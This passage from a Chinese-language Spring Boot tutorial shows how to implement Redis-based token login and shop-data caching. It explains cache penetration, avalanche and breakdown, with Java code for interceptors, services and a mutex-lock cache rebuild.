import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.experimental.Accessors;

import java.io.Serializable;
import java.time.LocalDate;
import java.time.LocalDateTime;

@Data
@EqualsAndHashCode(callSuper = false)
@Accessors(chain = true)
@TableName("tb_user_info")
public class UserInfo implements Serializable {

    private static final long serialVersionUID = 1L;

    /**
     * 主键，用户id
     */
    @TableId(value = "user_id", type = IdType.AUTO)
    private Long userId;

    /**
     * 城市名称
     */
    private String city;

    /**
     * 个人介绍，不要超过128个字符
     */
    private String introduce;

    /**
     * 粉丝数量
     */
    private Integer fans;

    /**
     * 关注的人的数量
     */
    private Integer followee;

    /**
     * 性别，0：男，1：女
     */
    private Boolean gender;

    /**
     * 生日
     */
    private LocalDate birthday;

    /**
     * 积分
     */
    private Integer credits;

    /**
     * 会员级别，0~9级,0代表未开通会员
     */
    private Boolean level;

    /**
     * 创建时间
     */
    private LocalDateTime createTime;

    /**
     * 更新时间
     */
    private LocalDateTime updateTime;


}
```

对应的服务类如下：

```java
package com.hmdp.service;

import com.hmdp.entity.UserInfo;
import com.baomidou.mybatisplus.extension.service.IService;

public interface IUserInfoService extends IService<UserInfo> {}
```

```java
package com.hmdp.service.impl;

import com.hmdp.entity.UserInfo;
import com.hmdp.mapper.UserInfoMapper;
import com.hmdp.service.IUserInfoService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import org.springframework.stereotype.Service;

@Service
public class UserInfoServiceImpl extends ServiceImpl<UserInfoMapper, UserInfo> implements IUserInfoService {}
```

```java
package com.hmdp.mapper;

import com.hmdp.entity.UserInfo;
import com.baomidou.mybatisplus.core.mapper.BaseMapper;

public interface UserInfoMapper extends BaseMapper<UserInfo> {}
```

### 集群的session共享问题

session共享问题：多台Tomcat并不共享session存储空间，当请求切换到不同Tomcat服务时导致数据丢失的问题。

早期Tomcat为了解决这个问题，提供了session拷贝功能（只要正确配置，多台Tomcat之间可以实现数据拷贝），它的缺点如下：

- 多台Tomcat保存相同数据，造成内存空间浪费。
- 数据拷贝有延迟，不能避免数据不一致。

因此这种方案没有得到广泛使用与认可。必须找出session的替代方案，它应该满足：

- 数据共享

- 内存存储（session是基于内存的，读写效率高）

- 结构是键值结构

Redis满足以上特点。

### 基于Redis实现共享session登录

使用Redis保存验证码，值可以是`String`，而键可以是手机号码（唯一标识一个用户）。注意不能使用`code`作为键（就像session实现那样），否则无法区分各个浏览器的请求，并且无法校验每个请求的`User`信息。

保存登录的用户信息，值可以使用`String`结构，以JSON字符串来保存，这比较直观。而`Hash`结构可以将对象中的每个字段独立存储，可以针对单个字段做CRUD，并且内存占用更少。键不推荐使用手机号码（不安全，有泄露风险），而是以随机token为键存储用户数据，这是登录凭证。

使用Redis代替session需要考虑的问题：

- 选择合适的数据结构。
- 选择合适的键（唯一性、方便以后找到、设置有效期）。
- 选择合适的存储粒度（只保留所需数据）。

修改`UserServiceImpl`的`sendCode`方法：

```java
import org.springframework.data.redis.core.StringRedisTemplate;
import javax.annotation.Resource;
import static com.hmdp.utils.RedisConstants.*;
import java.util.concurrent.TimeUnit;

@Resource
private StringRedisTemplate stringRedisTemplate;

// 保存验证码到Redis
// session.setAttribute("code", code); ->
stringRedisTemplate.opsForValue().set(LOGIN_CODE_KEY /* 业务前缀 */ + phone, code, LOGIN_CODE_TTL, TimeUnit.MINUTES /* 为键设置有效期 */);
```

`RedisConstants`定义了一些常量，这里先将它们全部列出来：

```java
package com.hmdp.utils;

public class RedisConstants {
    public static final String LOGIN_CODE_KEY = "login:code:";
    public static final Long LOGIN_CODE_TTL = 2L;
    public static final String LOGIN_USER_KEY = "login:token:";
    public static final Long LOGIN_USER_TTL = 30L;

    public static final Long CACHE_NULL_TTL = 2L;

    public static final Long CACHE_SHOP_TTL = 30L;
    public static final String CACHE_SHOP_KEY = "cache:shop:";

    public static final String LOCK_SHOP_KEY = "lock:shop:";
    public static final Long LOCK_SHOP_TTL = 10L;

    public static final String SECKILL_STOCK_KEY = "seckill:stock:";
    public static final String BLOG_LIKED_KEY = "blog:liked:";
    public static final String FEED_KEY = "feed:";
    public static final String SHOP_GEO_KEY = "shop:geo:";
    public static final String USER_SIGN_KEY = "sign:";
}
```

修改`UserServiceImpl`的`login`方法：

```java
import java.util.Map;
import java.util.HashMap;
import cn.hutool.core.lang.UUID;
import cn.hutool.core.bean.copier.CopyOptions;

@Override
public Result login(LoginFormDTO loginForm, HttpSession session) {
    // 校验手机号
    String phone = loginForm.getPhone();
    if (RegexUtils.isPhoneInvalid(phone)) {
        // 如果不符合，返回错误信息
        return Result.fail("手机号格式错误！");
    }
    // 从Redis获取验证码并校验
    String cacheCode = stringRedisTemplate.opsForValue().get(LOGIN_CODE_KEY + phone);
    String code = loginForm.getCode();
    if (cacheCode == null || !cacheCode.equals(code)) {
        // 不一致，报错
        return Result.fail("验证码错误");
    }
    // 一致，根据手机号查询用户
    User user = query().eq("phone", phone).one();
    // 判断用户是否存在
    if (user == null) {
        // 不存在，创建新用户并保存
        user = createUserWithPhone(phone);
    }
    // 保存用户信息到Redis中
    // 随机生成token，作为登录令牌
    String token = UUID.randomUUID().toString(true);
    // 将User对象转为HashMap存储
    UserDTO userDTO = BeanUtil.copyProperties(user, UserDTO.class);
    Map<String, Object> userMap = BeanUtil.beanToMap(userDTO, new HashMap<>(),
                CopyOptions.create()
                        .setIgnoreNullValue(true)
                        .setFieldValueEditor((fieldName, fieldValue) -> fieldValue.toString()));  // stringRedisTemplate要求键值均为String
    // 存储
    String tokenKey = LOGIN_USER_KEY + token;
    stringRedisTemplate.opsForHash().putAll(tokenKey, userMap);
    // 设置token有效期
    stringRedisTemplate.expire(tokenKey, LOGIN_USER_TTL, TimeUnit.MINUTES);
    // 返回token
    return Result.ok(token);
}
```

修改`LoginInterceptor`：

```java
package com.hmdp.utils;

import cn.hutool.core.bean.BeanUtil;
import cn.hutool.core.util.StrUtil;
import com.hmdp.dto.UserDTO;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import static com.hmdp.utils.RedisConstants.LOGIN_USER_TTL;

public class LoginInterceptor implements HandlerInterceptor {

    private final StringRedisTemplate stringRedisTemplate;  // 不能自动注入，因为该拦截器类不是Spring创建的

    public LoginInterceptor(StringRedisTemplate stringRedisTemplate) {
        this.stringRedisTemplate = stringRedisTemplate;
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        // 获取请求头中的token
        String token = request.getHeader("authorization");
        if (StrUtil.isBlank(token)) {
            // 不存在，拦截，返回401状态码
            response.setStatus(401);
            return false;
        }
        // 基于token获取Redis中的用户
        String key = RedisConstants.LOGIN_USER_KEY + token;
        Map<Object, Object> userMap = stringRedisTemplate.opsForHash().entries(key);
        // 判断用户是否存在
        if (userMap.isEmpty()) {
            // 不存在，拦截，返回401状态码
            response.setStatus(401);
            return false;
        }
        // 将查询到的Hash数据转为UserDTO对象
        UserDTO userDTO = BeanUtil.fillBeanWithMap(userMap, new UserDTO(), false);
        // 存在，保存用户信息到ThreadLocal
        UserHolder.saveUser(userDTO);
        // 刷新token有效期
        stringRedisTemplate.expire(key, LOGIN_USER_TTL, TimeUnit.MINUTES);
        // 放行
        return true;
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        // 移除用户
        UserHolder.removeUser();
    }

}
```

修改`MvcConfig`：

```java
package com.hmdp.config;

import com.hmdp.utils.LoginInterceptor;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import javax.annotation.Resource;

@Configuration
public class MvcConfig implements WebMvcConfigurer {

    @Resource
    private StringRedisTemplate stringRedisTemplate;

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new LoginInterceptor(stringRedisTemplate))
                .excludePathPatterns(
                        "/shop/**",
                        "/voucher/**",
                        "/shop-type/**",
                        "/upload/**",
                        "/blog/hot",
                        "/user/code",
                        "/user/login"
                );
    }

}
```

#### 登录拦截器的优化

由于拦截器拦截的是需要做登录校验的路径，因此如果用户一直访问不需要登录的页面，则用户的登录状态也会消失。因此可以在原有拦截器之前再加一个拦截器，它拦截一切路径，它的作用是得到用户并保存、刷新token有效期，而原来的拦截器的作用是登录拦截：

```java
package com.hmdp.utils;

import cn.hutool.core.bean.BeanUtil;
import cn.hutool.core.util.StrUtil;
import com.hmdp.dto.UserDTO;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import static com.hmdp.utils.RedisConstants.LOGIN_USER_TTL;

public class RefreshTokenInterceptor implements HandlerInterceptor {

    private final StringRedisTemplate stringRedisTemplate;

    public RefreshTokenInterceptor(StringRedisTemplate stringRedisTemplate) {
        this.stringRedisTemplate = stringRedisTemplate;
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
        // 获取请求头中的token
        String token = request.getHeader("authorization");
        if (StrUtil.isBlank(token)) {
            return true;
        }
        // 基于token获取Redis中的用户
        String key = RedisConstants.LOGIN_USER_KEY + token;
        Map<Object, Object> userMap = stringRedisTemplate.opsForHash().entries(key);
        // 判断用户是否存在
        if (userMap.isEmpty()) {
            return true;
        }
        // 将查询到的Hash数据转为UserDTO对象
        UserDTO userDTO = BeanUtil.fillBeanWithMap(userMap, new UserDTO(), false);
        // 存在，保存用户信息到ThreadLocal
        UserHolder.saveUser(userDTO);
        // 刷新token有效期
        stringRedisTemplate.expire(key, LOGIN_USER_TTL, TimeUnit.MINUTES);
        // 放行
        return true;
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) {
        // 移除用户
        UserHolder.removeUser();
    }

}
```

```java
package com.hmdp.utils;

import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class LoginInterceptor implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
        // 判断是否需要拦截（ThreadLocal中是否有用户）
        if (UserHolder.getUser() == null) {
            // 没有，需要拦截，设置状态码
            response.setStatus(401);
            // 拦截
            return false;
        }
        // 有用户，则放行
        return true;
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) {
        // 移除用户
        UserHolder.removeUser();
    }

}
```

配置拦截器：

```java
package com.hmdp.config;

import com.hmdp.utils.LoginInterceptor;
import com.hmdp.utils.RefreshTokenInterceptor;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import javax.annotation.Resource;

@Configuration
public class MvcConfig implements WebMvcConfigurer {

    @Resource
    private StringRedisTemplate stringRedisTemplate;

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        // 登录拦截器
        registry.addInterceptor(new LoginInterceptor())
                .excludePathPatterns(
                        "/shop/**",
                        "/voucher/**",
                        "/shop-type/**",
                        "/upload/**",
                        "/blog/hot",
                        "/user/code",
                        "/user/login"
                ).order(1);  // 设置优先级，值越大优先级越低，默认为0，也就是按照添加顺序执行
        // token刷新的拦截器
        registry.addInterceptor(new RefreshTokenInterceptor(stringRedisTemplate)).addPathPatterns("/**").order(0);
    }

}
```

## 商户查询缓存

**缓存（cache）**就是数据交换的缓冲区，是存贮数据的临时地方，一般读写性能较高。

在Web应用开发过程中也离不开缓存。用户通过浏览器发起请求时，首先可以从浏览器缓存中提取页面静态资源等数据，无需每次访问都加载这些数据，降低网络延迟，提高页面响应速度；未命中的数据从Tomcat中获取。Tomcat中还可以添加应用层缓存（例如将Redis作为应用层缓存）；缓存未命中，则从数据库中查询数据。数据库中也可以添加缓存，例如索引。数据查找最终要落到磁盘，同时表操作要用到CPU，因此可能要用到CPU的多级缓存与磁盘的读写缓存。

在Web应用开发中，缓存的作用：

- 降低后端负载。

- 提高读写效率，降低响应时间。

在Web应用开发中，缓存的成本：

- 数据一致性成本。

- 代码维护成本（解决一致性过程中需要复杂业务编码，同时会出现缓存穿透、击穿等问题）。

- 运维成本（避免缓存雪崩、保证缓存高可用，缓存往往需要搭建成集群模式，而缓存集群部署、维护等需要成本，同时集群部署需要硬件成本）。

### 添加Redis缓存

下面代码实现了根据`id`查询商铺信息的功能。

```java
package com.hmdp.controller;

import com.hmdp.dto.Result;
import com.hmdp.service.IShopService;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;

@RestController
@RequestMapping("/shop")
public class ShopController {

    @Resource
    private IShopService shopService;

    /**
     * 根据id查询商铺信息
     * @param id 商铺id
     * @return 商铺详情数据
     */
    @GetMapping("/{id}")
    public Result queryShopById(@PathVariable("id") Long id) {
        return Result.ok(shopService.getById(id));
    }
    
}
```

`IShopService`定义如下：

```java
package com.hmdp.service;

import com.hmdp.entity.Shop;
import com.baomidou.mybatisplus.extension.service.IService;

public interface IShopService extends IService<Shop> {}
```

`Shop`的定义如下：

```java
package com.hmdp.entity;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableField;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.experimental.Accessors;

import java.io.Serializable;
import java.time.LocalDateTime;

@Data
@EqualsAndHashCode(callSuper = false)
@Accessors(chain = true)
@TableName("tb_shop")
public class Shop implements Serializable {

    private static final long serialVersionUID = 1L;

    /**
     * 主键
     */
    @TableId(value = "id", type = IdType.AUTO)
    private Long id;

    /**
     * 商铺名称
     */
    private String name;

    /**
     * 商铺类型的id
     */
    private Long typeId;

    /**
     * 商铺图片，多个图片以','隔开
     */
    private String images;

    /**
     * 商圈，例如陆家嘴
     */
    private String area;

    /**
     * 地址
     */
    private String address;

    /**
     * 经度
     */
    private Double x;

    /**
     * 维度
     */
    private Double y;

    /**
     * 均价，取整数
     */
    private Long avgPrice;

    /**
     * 销量
     */
    private Integer sold;

    /**
     * 评论数量
     */
    private Integer comments;

    /**
     * 评分，1~5分，乘10保存，避免小数
     */
    private Integer score;

    /**
     * 营业时间，例如 10:00-22:00
     */
    private String openHours;

    /**
     * 创建时间
     */
    private LocalDateTime createTime;

    /**
     * 更新时间
     */
    private LocalDateTime updateTime;

    @TableField(exist = false)
    private Double distance;
    
}
```

每次传递过来商铺`id`，服务器都要从数据库中查询相应记录，效率低。可以在客户端与数据库之间添加一个中间层（Redis），客户端请求优先到达缓存，如果缓存命中，直接返回；否则，查询数据库，结果返回给客户端，同时将结果写入Redis缓存中，这会使得Redis命中率越来越高。

  修改`ShopController`的`queryShopById`方法：

```java
@GetMapping("/{id}")
public Result queryShopById(@PathVariable("id") Long id) {
    return shopService.queryById(id);
}
```

相应的`IShopService`修改如下：

```java
package com.hmdp.service;

import com.hmdp.dto.Result;
import com.hmdp.entity.Shop;
import com.baomidou.mybatisplus.extension.service.IService;

public interface IShopService extends IService<Shop> {

    Result queryById(Long id);
    
}
```

实现类：

```java
package com.hmdp.service.impl;

import cn.hutool.core.util.StrUtil;
import cn.hutool.json.JSONUtil;
import com.hmdp.dto.Result;
import com.hmdp.entity.Shop;
import com.hmdp.mapper.ShopMapper;
import com.hmdp.service.IShopService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;

import javax.annotation.Resource;

import static com.hmdp.utils.RedisConstants.*;

@Service
public class ShopServiceImpl extends ServiceImpl<ShopMapper, Shop> implements IShopService {

    @Resource
    private StringRedisTemplate stringRedisTemplate;

    @Override
    public Result queryById(Long id) {
        String key = CACHE_SHOP_KEY + id;
        // 从Redis查询商铺缓存
        String shopJson = stringRedisTemplate.opsForValue().get(key);
        // 判断是否存在
        if (StrUtil.isNotBlank(shopJson)) {
            // 存在，直接返回
            Shop shop = JSONUtil.toBean(shopJson, Shop.class);
            return Result.ok(shop);
        }
        // 不存在，根据id查询数据库
        Shop shop = getById(id);
        // 不存在，返回错误
        if (shop == null) {
            return Result.fail("店铺不存在！");  // 也可以返回Result.ok()
        }
        // 存在，写入Redis
        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop));
        // 返回
        return Result.ok(shop);
    }

}
```

`ShopMapper`的定义如下：

```java
package com.hmdp.mapper;

import com.hmdp.entity.Shop;
import com.baomidou.mybatisplus.core.mapper.BaseMapper;

public interface ShopMapper extends BaseMapper<Shop> {}
```

为了完整，下面给店铺类型查询业务添加缓存：

```java
package com.hmdp.controller;

import com.hmdp.dto.Result;
import com.hmdp.entity.ShopType;
import com.hmdp.service.IShopTypeService;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.annotation.Resource;
import java.util.List;

@RestController
@RequestMapping("/shop-type")
public class ShopTypeController {
    @Resource
    private IShopTypeService typeService;

    @GetMapping("list")
    public Result queryTypeList() {
        List<ShopType> typeList = typeService
                .query().orderByAsc("sort").list();
        return Result.ok(typeList);
    }
}
```

```Java
package com.hmdp.service;

import com.hmdp.entity.ShopType;
import com.baomidou.mybatisplus.extension.service.IService;

public interface IShopTypeService extends IService<ShopType> {}
```

```java
package com.hmdp.service.impl;

import com.hmdp.entity.ShopType;
import com.hmdp.mapper.ShopTypeMapper;
import com.hmdp.service.IShopTypeService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import org.springframework.stereotype.Service;

@Service
public class ShopTypeServiceImpl extends ServiceImpl<ShopTypeMapper, ShopType> implements IShopTypeService {}
```

```java
package com.hmdp.entity;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import com.fasterxml.jackson.annotation.JsonIgnore;
import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.experimental.Accessors;

import java.io.Serializable;
import java.time.LocalDateTime;

@Data
@EqualsAndHashCode(callSuper = false)
@Accessors(chain = true)
@TableName("tb_shop_type")
public class ShopType implements Serializable {

    private static final long serialVersionUID = 1L;

    /**
     * 主键
     */
    @TableId(value = "id", type = IdType.AUTO)
    private Long id;

    /**
     * 类型名称
     */
    private String name;

    /**
     * 图标
     */
    private String icon;

    /**
     * 顺序
     */
    private Integer sort;

    /**
     * 创建时间
     */
    @JsonIgnore
    private LocalDateTime createTime;

    /**
     * 更新时间
     */
    @JsonIgnore
    private LocalDateTime updateTime;


}
```

```java
package com.hmdp.mapper;

import com.hmdp.entity.ShopType;
import com.baomidou.mybatisplus.core.mapper.BaseMapper;

public interface ShopTypeMapper extends BaseMapper<ShopType> {

}
```

### 缓存更新策略

常见的缓存更新策略如下：

|          | 内存淘汰                                                     | 超时剔除                                                     | 主动更新                                   |
| -------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------ |
| 说明     | 不用自己维护，利用Redis的内存淘汰机制，当内存不足时自动淘汰部分数据，下次查询时更新缓存 | 给缓存数据添加TTL时间，到期后自动删除缓存，下次查询时更新缓存 | 编写业务逻辑，在修改数据库的同时，更新缓存 |
| 一致性   | 差                                                           | 一般                                                         | 好                                         |
| 维护成本 | 无                                                           | 低                                                           | 高                                         |

业务场景：

- 低一致性需求：使用内存淘汰机制。例如店铺类型的查询缓存。

- 高一致性需求：主动更新，并以超时剔除作为兜底方案。例如店铺详情查询的缓存。

主动更新策略的业务实现常见有三种模式：

- Cache Aside Pattern（最常用）：由缓存的调用者，在更新数据库的同时更新缓存。
- Read/Write Through Pattern（维护复杂）：缓存与数据库整合为一个服务，由服务来维护一致性。调用者调用该服务，无需关心缓存一致性问题。
- Write Behind Caching Pattern：调用者只操作缓存，由其它线程异步的将缓存数据持久化到数据库，保证最终一致。它的好处是效率高，因为可以将多次缓存操作合并为一次持久化操作，同时可以忽略对同一个键的多次中间更新；缺点在于维护复杂、难以保证一致性，尤其是缓存有可能宕机。

操作缓存和数据库时有三个问题需要考虑：

- 删除缓存还是更新缓存？

  - 更新缓存：每次更新数据库都更新缓存，无效写操作较多，并且存在较大的线程安全问题。

  - 删除缓存：更新数据库时让缓存失效，查询时再更新缓存（延迟更新），没有无效更新，线程安全问题发生概率相对较低。（推荐）

- 如何保证缓存与数据库的操作的同时成功或失败？

  - 单体系统，将缓存与数据库操作放在一个事务。
  - 分布式系统，利用TCC等分布式事务方案。

- 先操作缓存还是先操作数据库？

  - 先删除缓存，再操作数据库。
    - 发生不一致的情况：线程1删除缓存$\rightarrow$线程2查询缓存，未命中，查询数据库$\rightarrow$线程2写入缓存$\rightarrow$线程1更新数据库。由于删除缓存、查询缓存以及查询数据库的操作快于更新数据库的操作，因此这种线程安全问题发生概率较高。

  - 先操作数据库，再删除缓存。（推荐）
    - 发生不一致的情况：线程1查询缓存，未命中，查询数据库$\rightarrow$线程2更新数据库$\rightarrow$线程2删除缓存$\rightarrow$线程1写入缓存。同理可得，这种线程安全问题发生概率较低。

因此缓存更新策略的最佳实践方案如下：

- 低一致性需求：使用Redis自带的内存淘汰机制。

- 高一致性需求：主动更新，并以超时剔除作为兜底方案。
  - 读操作：
    - 缓存命中则直接返回。
    - 缓存未命中则查询数据库，并写入缓存，设定超时时间。
  - 写操作：
    - 先写数据库，然后再删除缓存。
    - 要确保数据库与缓存操作的原子性。

下面给查询商铺的缓存添加超时剔除和主动更新的策略，修改`ShopController`中的业务逻辑，满足下面的需求：

- 根据id查询店铺时，如果缓存未命中，则查询数据库，将数据库结果写入缓存，并设置超时时间。

- 根据id修改店铺时，先修改数据库，再删除缓存。

修改`ShopServiceImpl`的`queryById`方法：

```java
import java.util.concurrent.TimeUnit;

// 存在，写入Redis
stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);
```

在`ShopController`添加方法：

```java
import com.hmdp.entity.Shop;

/**
 * 更新商铺信息
 * @param shop 商铺数据
 * @return 无
 */
@PutMapping
public Result updateShop(@RequestBody Shop shop) {
    // 写入数据库
    return shopService.update(shop);
}
```

在`IShopService`中添加方法：

```java
Result update(Shop shop);
```

在`ShopServiceImpl`中添加方法：

```java
import org.springframework.transaction.annotation.Transactional;

@Override
@Transactional
public Result update(Shop shop) {
    Long id = shop.getId();
    if (id == null) {
        return Result.fail("店铺id不能为空");
    }
    // 更新数据库
    updateById(shop);
    // 删除缓存
    stringRedisTemplate.delete(CACHE_SHOP_KEY + shop.getId());  // 如果是分布式系统，更新数据库与删除缓存操作不一定在一个方法中，可能需要通过MQ异步通过对方，对方完成缓存处理。要想保证一致性，需要借助于TTC等方案保证强一致性
    return Result.ok();
}
```

### 缓存穿透

**缓存穿透**是指客户端请求的数据在缓存中和数据库中都不存在，这样缓存永远不会生效，这些请求都会打到数据库。用户不断发起这样的请求，会给数据库带来巨大压力。

常见的解决方案有两种：

- 缓存空对象。

  - 优点：实现简单，维护方便。

  - 缺点：额外的内存消耗（可以在缓存空对象时设置（比较短的）TTL）；可能造成短期的不一致，即请求的数据不存在，Redis中缓存空对象，并在其有效期内数据库中插入了请求的数据，此时可以使用该数据覆盖缓存中的空对象。

- 布隆过滤：在客户端与Redis间加入布隆过滤器，用户请求首先到达布隆过滤器，布隆过滤器判定数据不存在则拒绝，否则放行。

  - 优点：内存占用较少，没有多余键。
  - 缺点：实现复杂；存在误判可能。

其他解决方案（主动方案）包括：

- 增强id的复杂度，避免被猜测id规律。
- 做好数据的基础格式校验。
- 加强用户权限校验（例如要求登录、限流、访问用户控制、访问频率限制）。
- 做好热点参数的限流。

下面使用缓存空对象方案解决缓存穿透问题，修改`ShopServiceImpl`的`queryById`方法：

```java
@Override
public Result queryById(Long id) {
    String key = CACHE_SHOP_KEY + id;
    // 从Redis查询商铺缓存
    String shopJson = stringRedisTemplate.opsForValue().get(key);
    // 判断是否存在（如果命中空值，也算不存在）
    if (StrUtil.isNotBlank(shopJson)) {
        // 存在，直接返回
        Shop shop = JSONUtil.toBean(shopJson, Shop.class);
        return Result.ok(shop);
    }
    // 判断命中的是否是空值
    if (shopJson != null) {
        // 返回一个错误信息
        return Result.fail("店铺信息不存在！");
    }
    // 不存在，根据id查询数据库
    Shop shop = getById(id);
    // 不存在，返回错误
    if (shop == null) {
        // 将空值写入Redis
        stringRedisTemplate.opsForValue().set(key, "", CACHE_NULL_TTL, TimeUnit.MINUTES);
        // 返回错误信息
        return Result.fail("店铺不存在！");
    }
    // 存在，写入Redis
    stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);
    // 返回
    return Result.ok(shop);
}
```

### 缓存雪崩

**缓存雪崩**是指在同一时段大量的缓存键同时失效或者Redis服务宕机，导致大量请求到达数据库，带来巨大压力。

解决方案：

- 给不同的键的TTL添加随机值。缓存预热可能提前将数据库中的数据批量导入缓存中，数据的TTL设置相同值会导致它们同时过期，此时可以在TTL后加上随机值。
- 利用Redis集群提高服务的可用性。
- 给缓存业务添加降级限流策略。提前做好容错处理，当Redis发生故障，及时做服务降级，例如快速失败、拒绝服务，而不是将请求继续压到数据库上。
- 给业务添加多级缓存。浏览器缓存（主要是静态数据）$\rightarrow$反向代理服务器Nginx缓存$\rightarrow$Redis缓存$\rightarrow$JVM内部建立本地缓存$\rightarrow$数据库。

### 缓存击穿

**缓存击穿问题**也叫热点Key问题，就是一个被高并发访问并且缓存重建业务较复杂的键突然失效了，无数的请求访问会在瞬间给数据库带来巨大的冲击。

常见的解决方案有两种：

- 互斥锁：线程查询缓存未命中，需要获取互斥锁。第一个成功获取互斥锁的线程查询数据库重建缓存数据并写入缓存，最后释放锁。在该线程持有锁期间，其他线程获取互斥锁失败，需要休眠一会再重试，重试成功则缓存命中。
  - 优先：（相比于逻辑过期）没有额外的内存消耗；保证一致性；实现简单。
  - 缺点：线程需要等待，性能受影响；可能有死锁风险。
- 逻辑过期：取消键的TTL（需要适时主动删除），在值中添加一个逻辑过期时间。线程查询缓存，如果发现逻辑时间已过期，则获取互斥锁。第一个成功获取互斥锁的线程开启新线程，由新线程查询数据库重建缓存数据，写入缓存、重置逻辑过期时间，释放锁。原来的线程返回过期数据。其他线程查询缓存，如果发现逻辑时间已过期，则获取互斥锁失败，此时直接返回过期数据。
  - 优先：线程无需等待，性能较好。
  - 缺点：不保证一致性；有额外内存消耗；实现复杂。

互斥锁保证了一致性，牺牲了可用性，逻辑过期反之。在一致性与可用性之间需要作出抉择。

#### 基于互斥锁方式解决缓存击穿问题

下面基于互斥锁方式解决缓存击穿问题。需求：修改根据id查询商铺的业务，基于互斥锁方式来解决缓存击穿问题。

在`ShopServiceImpl`中定义两个方法，分别用于获取锁与释放锁：

```java
import cn.hutool.core.util.BooleanUtil;

private boolean tryLock(String key) {
    // 使用setnx命令模拟锁的操作
    // 设置有效期，以防止程序出现意外，锁永远无法释放
    // 有效期的长短取决于业务，一般比业务执行时长长一些（例如10倍长）
    Boolean flag = stringRedisTemplate.opsForValue().setIfAbsent(key, "1", LOCK_SHOP_TTL, TimeUnit.SECONDS);
    return BooleanUtil.isTrue(flag);  // 防止拆箱过程中出现空指针异常
}

private void unlock(String key) {
    stringRedisTemplate.delete(key);
}
```

修改`ShopServiceImpl`的`queryById`方法：

```java
@Override
public Result queryById(Long id) {
    String key = CACHE_SHOP_KEY + id;
    // 从Redis查询商铺缓存
    String shopJson = stringRedisTemplate.opsForValue().get(key);
    // 判断是否存在
    if (StrUtil.isNotBlank(shopJson)) {
        // 存在，直接返回
        Shop shop = JSONUtil.toBean(shopJson, Shop.class);
        return Result.ok(shop);
    }
    // 判断命中的是否是空值
    if (shopJson != null) {
        // 返回一个错误信息
        return Result.fail("店铺信息不存在！");
    }
    // 实现缓存重建：获取互斥锁
    String lockKey = LOCK_SHOP_KEY + id;
    Shop shop;
    try {
        boolean isLock = tryLock(lockKey);
        // 实现缓存重建：判断是否获取成功
        if (!isLock) {
            // 实现缓存重建：失败，则休眠并重试
            Thread.sleep(50);
            return queryById(id);
        }
        // 实现缓存重建：成功，根据id查询数据库
        shop = getById(id);
        // 模拟重建的延时，可以使用JMeter模拟高并发场景（创建多个访问/shop/1的线程）
        Thread.sleep(200);
        // 不存在，返回错误
        if (shop == null) {
            // 将空值写入Redis
            stringRedisTemplate.opsForValue().set(key, "", CACHE_NULL_TTL, TimeUnit.MINUTES);
            // 返回错误信息
            return Result.fail("店铺不存在！");
        }
        // 存在，写入Redis
        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);
    } catch (InterruptedException e) {
        throw new RuntimeException(e);
    } finally {
        // 实现缓存重建：释放互斥锁
        unlock(lockKey);
    }
    // 返回
    return Result.ok(shop);
}
```

#### 基于逻辑过期方式解决缓存击穿问题

下面基于逻辑过期方式解决缓存击穿问题。需求：修改根据id查询商铺的业务，基于逻辑过期方式来解决缓存击穿问题。

创建一个工具类：

```java
package com.hmdp.utils;

import lombok.Data;

import java.time.LocalDateTime;

@Data
public class RedisData {

    private LocalDateTime expireTime;

    private Object data;
    
}
```

